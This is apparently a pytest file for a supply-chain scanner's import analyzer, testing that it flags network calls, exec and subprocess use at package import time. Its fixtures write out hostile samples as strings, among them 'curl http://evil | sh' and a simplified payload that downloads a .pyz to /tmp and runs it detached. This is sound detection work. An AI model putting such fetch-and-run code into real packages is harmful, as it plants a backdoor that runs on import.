# SPDX-License-Identifier: AGPL-3.0-or-later
from pathlib import Path

from pkgsentry.analyze.imports import analyze_imports


def test_clean_init(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text("VERSION = '1.0'\n")
    assert analyze_imports(tmp_path) == []


def test_network_call_at_import_time(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import urllib.request\nurllib.request.urlopen('http://x').read()\n"
    )
    findings = analyze_imports(tmp_path)
    assert any(f.rule_id == "imports.network_at_import" for f in findings)


def test_exec_at_import_time(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text("exec('print(1)')\n")
    findings = analyze_imports(tmp_path)
    assert any(f.rule_id == "imports.exec_at_import" for f in findings)


def test_dotted_compile_does_not_fire(tmp_path):
    """Real-world: re.compile, tabulate.compile, sympy.compile etc. are everywhere
    in legit code. exec/eval/compile rule must only match bare-builtin calls."""
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import re\nPATTERN = re.compile(r'foo')\n"
    )
    findings = analyze_imports(tmp_path)
    assert not any(f.rule_id == "imports.exec_at_import" for f in findings)


def test_subprocess_at_import_low_confidence(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['git', 'describe'])\n"
    )
    findings = analyze_imports(tmp_path)
    ids = {(f.rule_id, f.severity, f.confidence) for f in findings}
    assert ("imports.subprocess_at_import", "medium", "low") in ids
    # Plain subprocess (no /tmp, no start_new_session, no python re-invoke) does NOT
    # promote to suspicious tier.
    assert not any(f.rule_id == "imports.subprocess_at_import_suspicious" for f in findings)


def test_subprocess_at_import_suspicious_tmp_path(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import subprocess\nsubprocess.Popen(['python3', '/tmp/x.pyz'])\n"
    )
    findings = analyze_imports(tmp_path)
    assert any(f.rule_id == "imports.subprocess_at_import_suspicious" and f.severity == "high"
               for f in findings)


def test_subprocess_at_import_suspicious_start_new_session(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import subprocess\nsubprocess.Popen(['x'], start_new_session=True)\n"
    )
    findings = analyze_imports(tmp_path)
    assert any(f.rule_id == "imports.subprocess_at_import_suspicious" for f in findings)


def test_subprocess_at_import_suspicious_shell_true(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import subprocess\nsubprocess.run('curl http://evil | sh', shell=True)\n"
    )
    findings = analyze_imports(tmp_path)
    assert any(f.rule_id == "imports.subprocess_at_import_suspicious" for f in findings)


def test_network_subprocess_chain_critical(tmp_path):
    (tmp_path / "pkg").mkdir()
    # The durabletask-shape payload (simplified).
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import urllib.request, subprocess\n"
        "if True:\n"
        "    urllib.request.urlretrieve('http://x', '/tmp/y.pyz')\n"
        "    subprocess.Popen(['python3', '/tmp/y.pyz'], start_new_session=True)\n"
    )
    findings = analyze_imports(tmp_path)
    chain = [f for f in findings if f.rule_id == "imports.network_subprocess_chain"]
    assert len(chain) == 1
    assert chain[0].severity == "critical"
    assert chain[0].confidence == "high"


def test_no_subprocess_in_function_body(tmp_path):
    """Subprocess inside a function definition should NOT fire — it doesn't run at import."""
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "__init__.py").write_text(
        "import subprocess\n"
        "def boot():\n"
        "    subprocess.Popen(['x'], start_new_session=True)\n"
    )
    findings = analyze_imports(tmp_path)
    assert not any(f.rule_id.startswith("imports.subprocess") for f in findings)
